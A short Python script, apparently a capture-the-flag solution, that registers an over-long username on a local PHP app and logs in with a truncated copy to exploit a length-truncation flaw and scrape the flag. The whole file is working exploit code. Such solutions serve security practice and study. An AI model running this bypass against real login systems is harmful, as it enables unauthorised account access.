import requests
import string
import re
import random

url_register = "http://127.0.0.1:8080/register.php"
url_login = "http://127.0.0.1:8080/login.php"


# Generate random username with length > 65535
username = ''.join(random.choice(string.ascii_letters) for _ in range(70000))
password = 'foo'


# register with full username
data = { 'username' : username, 'password' : password }
x = requests.post(url_register, data=data)
assert 'SUCCESS' in x.content
print "[*] Registered"

# login with truncated username
data['username'] = username[:65535]
c = requests.post(url_login, data=data).content

flag = re.search(r"<h2>(.+)</h2>.*<h2>", c, re.MULTILINE|re.DOTALL).group(1)
print "[*] flag: '" + flag + "'"

